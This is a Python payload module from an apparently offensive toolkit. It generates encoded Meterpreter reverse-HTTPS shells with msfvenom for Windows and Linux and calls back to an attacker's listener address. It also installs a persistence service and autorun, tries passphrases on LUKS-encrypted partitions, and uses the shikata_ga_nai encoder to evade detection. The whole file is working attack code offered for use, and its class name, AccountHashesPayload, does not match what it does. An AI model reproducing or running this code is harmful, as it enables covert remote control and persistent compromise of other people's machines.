"""
Infect with Meterpreter. Note that it uses Metasploit itself.
"""
import random
import string

from snr.core.payload.payload import Context, Payload
from snr.core.util import common_utils, programs

msfvenom = programs.program_wrapper_factory("msfvenom")


class AccountHashesPayload(Payload):
    AUTHORS = ("GlobularOne",)
    TARGET_OS_LIST = ("GNU/Linux",)
    INPUTS = (
        ("ENCODER", "x86/shikata_ga_nai", -1, "Encoder to use for x86"),
        ("LINUX_SERVICE_NAME", "", -1,
         "Name of the persistance service for Linux", True),
        ("LINUX_SERVICE_DESCRIPTION", "", -1,
         "Description of the persistance service for Linux", True),
        ("LHOST", "", -1, "Local host (Listener address)", True),
        ("LPORT", 8443, -1, "Local port (Listener port)"),
        ("LURL", "", -1, "Local HTTP address, if left empty will be generated randomly"),
        ("PASSPHRASES", [], -1, "Passphrases to try for LUKS-encrypted partitions"),
    )

    WINDOWS_PAYLOAD = "payload/windows/meterpreter_reverse_https"
    LINUX_PAYLOAD = "payload/linux/x86/meterpreter_reverse_https"
    LURL_LEN = 16

    def generate(self, ctx: Context) -> int:
        variables = self.get_self_variables()
        assert isinstance(variables['ENCODER'], str)
        assert isinstance(variables['LHOST'], str)
        assert isinstance(variables['LPORT'], str)
        assert isinstance(variables['LURL'], str)
        if len(variables['LURL']) == 0:
            variables['LURL'] = "".join(random.sample(
                string.ascii_letters, k=self.LURL_LEN))
            common_utils.print_warning(
                f"Random LURL generated! Set LURL to {variables['LURL']} on the listener")
        for payload_name, platform in ((self.WINDOWS_PAYLOAD, "windows"), (self.LINUX_PAYLOAD, "linux")):
            msfvenom().invoke_and_wait(None,
                                       f"LHOST={variables['LHOST']}",
                                       f"LPORT={variables['LPORT']}",
                                       f"LURL={variables['LURL']}",
                                       options={
                                           "payload": payload_name,
                                           "encoder": variables['ENCODER'],
                                           "output": platform
                                       })
            ctx.mkdir("root/data")
            self.copy_root_to_root(ctx, __file__, platform, f"data/{platform}")
        self.format_payload_and_write(ctx, variables)
        self.add_autorun(ctx)
        return 0


payload = AccountHashesPayload()
